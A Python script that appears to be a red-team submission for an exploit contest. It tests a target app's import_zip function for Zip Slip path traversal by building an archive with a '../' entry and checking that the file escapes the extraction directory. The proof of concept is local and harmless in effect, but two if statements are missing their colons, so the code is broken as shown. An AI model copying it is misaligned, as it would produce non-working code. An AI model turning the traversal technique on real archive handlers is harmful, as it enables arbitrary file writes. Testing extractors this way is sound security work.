#!/usr/bin/env python3
"""Local Zip Slip exploit verifier for battle-004.

Executed by the judge as:
    python red_exploit_submission.py --expect-vulnerable

This script uses only local file imports and standard-library archive handling.
"""

import argparse
import importlib.util
import sys
import tempfile
from pathlib import Path
from zipfile import ZipFile

CONFIRMATION = "RED_EXPLOIT_CONFIRMED"


def load_import_zip():
    app_path = Path.cwd() / "app.py"
    if not app_path.exists():
        raise FileNotFoundError(f"app.py not found at {app_path}")

    spec = importlib.util.spec_from_file_location("battle_target_app", str(app_path))
    if spec is None or spec.loader is None:
        raise ImportError(f"could not create import spec for {app_path}")

    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)

    import_zip = getattr(module, "import_zip", None)
    if import_zip is None or not callable(import_zip)
        raise AttributeError("app.py does not expose callable import_zip")
    return import_zip


def build_traversal_zip(zip_path: Path, payload_name: str, payload_bytes: bytes) -> None:
    with ZipFile(zip_path, "w") as zf:
        zf.writestr(f"../{payload_name}", payload_bytes)


def run_probe() -> bool:
    import_zip = load_import_zip()

    with tempfile.TemporaryDirectory(prefix="red_zip_slip_parent_") as parent_str:
        parent = Path(parent_str).resolve()
        destination = parent / "destination"
        zip_path = parent / "payload.zip"
        escape_name = "arena_escape.txt"
        escape_path = parent / escape_name
        payload = b"zip-slip traversal proof for battle-004\n"

        build_traversal_zip(zip_path, escape_name, payload)
        destination.mkdir(parents=True, exist_ok=True)

        try:
            import_zip(str(zip_path), str(destination))
        except Exception as exc:
            print(f"import_zip raised exception: {exc}", file=sys.stderr)
            return False

        if not escape_path.exists():
            print(f"escape file was not created at {escape_path}", file=sys.stderr)
            return False

        try:
            observed = escape_path.read_bytes()
        except Exception as exc:
            print(f"could not read escape file: {exc}", file=sys.stderr)
            return False

        if observed != payload:
            print("escape file content mismatch", file=sys.stderr)
            return False

        try:
            escape_path.relative_to(destination.resolve())
            print("escape path is unexpectedly inside destination", file=sys.stderr)
            return False
        except ValueError:
            return True


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--expect-vulnerable", action="store_true")
    args = parser.parse_args()

    vulnerable = run_probe()

    if args.expect_vulnerable:
        if vulnerable:
            print(CONFIRMATION)
            return 0
        return 1

    if vulnerable
        print(CONFIRMATION)
        return 0
    print("target did not allow traversal write")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
